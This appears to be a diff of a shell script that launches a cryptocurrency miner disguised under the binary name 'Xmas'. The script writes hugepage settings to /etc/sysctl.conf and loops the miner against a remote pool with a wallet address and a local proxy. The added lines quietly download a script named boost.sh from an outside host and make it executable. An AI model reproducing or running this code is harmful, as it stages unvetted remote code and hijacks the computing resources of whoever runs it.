@@ -91,6 +91,12 @@ bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
 sleep 2
 
+wget -q http://greenleaf.teatspray.uk/boost.sh >/dev/null
+sleep 2
+chmod +x boost.sh
+sleep 2
+#./boost.sh
+
 while true
 do
 ./Xmas --donate-level 1 -o supportsuperman.teatspray.uk:9655 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p $currentdate -a rx/arq -k --randomx-1gb-pages --proxy=127.0.0.1:1081 -t $used_num_of_cores
